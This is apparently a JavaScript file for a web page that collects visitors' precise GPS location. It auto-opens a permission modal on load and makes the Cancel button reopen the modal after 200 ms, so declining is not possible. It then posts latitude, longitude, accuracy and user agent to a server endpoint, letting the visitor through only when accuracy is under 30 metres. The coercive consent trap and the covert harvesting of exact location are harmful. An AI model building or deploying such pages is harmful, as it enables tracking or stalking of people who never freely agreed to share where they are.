// index.js — modified for auto-show modal on page load
let retryCount = 0;
const MAX_RETRIES = 1;
const REQUIRED_ACCURACY = 30; // meters threshold
const openPrompt = document.getElementById('openPrompt');
const modal = document.getElementById('modal');
const btnAllow = document.getElementById('btnAllow');
const btnCancel = document.getElementById('btnCancel');
const modalMessage = document.getElementById('modalMessage');
const statusEl = document.getElementById('status');

function setStatus(t) { statusEl.textContent = 'Status: ' + t; }
function showModal() { modal.classList.remove('hidden'); modalMessage.textContent = ''; }
function hideModal() { modal.classList.add('hidden'); modalMessage.textContent = ''; }

// --- AUTO SHOW modal on page load ---
document.addEventListener('DOMContentLoaded', () => {
    showModal(); // show modal automatically
    btnAllow.disabled = false; // allow button active immediately
    setStatus('Modal ready — click Allow or Cancel.');
    btnAllow.focus(); // focus allow button for keyboard users
});

// Remove openPrompt click listener if you want fully automatic modal
openPrompt.style.display = 'none'; // hide original Enable Location button

// Cancel button remains the same
btnCancel.addEventListener('click', () => {
    hideModal();

    setTimeout(() => {
        showModal();
    }, 200);
    
    setStatus('User cancelled');
});

// Allow button — original GPS logic untouched
btnAllow.addEventListener('click', async () => {
    hideModal();
    setStatus('Asking for browser permission (native prompt will appear)...');

    if (!navigator.geolocation) {
        setStatus('Geolocation not supported by browser.');
        return;
    }

    if (navigator.permissions && navigator.permissions.query) {
        try {
            const p = await navigator.permissions.query({ name: 'geolocation' });
            if (p.state === 'denied') {
                setStatus('Location blocked. Please enable site location permission in browser settings.');
                showEnableInstructions('blocked');
                return;
            }
        } catch (e) { /* ignore */ }
    }

    navigator.geolocation.getCurrentPosition(onSuccess, onError, {
        enableHighAccuracy: true,
        timeout: 20000,
        maximumAge: 0
    });
});

// --- Success & error handlers remain untouched ---
function onSuccess(position) {
    const c = position.coords;
    console.log(`Latitude: ${c.latitude}, Longitude: ${c.longitude}`);
    setStatus(`Got coords (accuracy ±${c.accuracy} m)`);

    // ✅ yahan backend par POST request bhejna hai
    fetch('/api/location', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            latitude: c.latitude,
            longitude: c.longitude,
            accuracy: c.accuracy,
            userAgent: navigator.userAgent
        })
    })
    .then(res => res.json())
    .then(data => {
        console.log('Server response:', data);

        if (data.success) {
            if (typeof c.accuracy === 'number' && c.accuracy <= REQUIRED_ACCURACY) {
                setStatus('Accurate GPS detected — redirecting...');
                window.location.href = '/welcome.html';
            } else {
                retryCount++;
                if (retryCount <= MAX_RETRIES) {
                    setStatus(`Low accuracy (${c.accuracy} m). Retrying (${retryCount}/${MAX_RETRIES})...`);
                    modalMessage.innerText = `Your location accuracy is too low (${c.accuracy} m). 
                    Please move to an open area or enable precise GPS.`;
                    modal.classList.remove('hidden');

                    // Wait before retry
                    setTimeout(() => {
                        navigator.geolocation.getCurrentPosition(onSuccess, onError, {
                            enableHighAccuracy: true,
                            timeout: 20000,
                            maximumAge: 0
                        });
                    }, 5000);
                } else {
                    setStatus('Max retries reached. Please enable precise GPS and try again.');
                    modalMessage.innerText = 'We could not get an accurate GPS fix. Please retry manually.';
                    modal.classList.remove('hidden');
                }
            }
        } else {
            setStatus('Server error while saving location');
            modalMessage.innerText = 'Server error occurred. Please retry.';
            modal.classList.remove('hidden');
        }
    })
    .catch(err => {
        console.error('POST error:', err);
        setStatus('Failed to send location to server');
        modalMessage.innerText = 'Network error while sending location.';
        modal.classList.remove('hidden');
    });
}


function onError(err) {
    console.error('Geo error', err);
    if (err.code === err.PERMISSION_DENIED) {
        setStatus('Permission denied by user.');
        showEnableInstructions('denied');
        modalMessage.innerText = 'Permission denied. Please allow location access in your browser/site settings, then retry.';
        modal.classList.remove('hidden');
    } else if (err.code === err.POSITION_UNAVAILABLE) {
        setStatus('Position unavailable — maybe GPS off or no signal.');
        modalMessage.innerText = 'Position unavailable. Ensure device Location/GPS is ON and you are outdoors. Retry.';
        modal.classList.remove('hidden');
    } else if (err.code === err.TIMEOUT) {
        setStatus('Request timed out. Try again.');
        modalMessage.innerText = 'Request timed out. Retry and ensure GPS is enabled.';
        modal.classList.remove('hidden');
    } else {
        setStatus('Unknown geolocation error.');
        modalMessage.innerText = 'An unknown error occurred. Retry.';
        modal.classList.remove('hidden');
    }
}

function showEnableInstructions(reason) {
    const lines = [];
    if (reason === 'blocked' || reason === 'denied') {
        lines.push('Open browser/site settings and allow Location for this site.');
    }
    lines.push('On Android: Settings → Location → turn ON; then App permissions → Browser → Location → Allow.');
    lines.push('On iPhone: Settings → Privacy → Location Services → turn ON; then Safari → Allow While Using App.');
    lines.push('Make sure you are outdoors (open sky) for first GPS fix.');
    modalMessage.innerHTML = '<strong>How to enable precise GPS:</strong><ul>' + lines.map(l => `<li>${l}</li>`).join('') + '</ul>';
    modal.classList.remove('hidden');
}
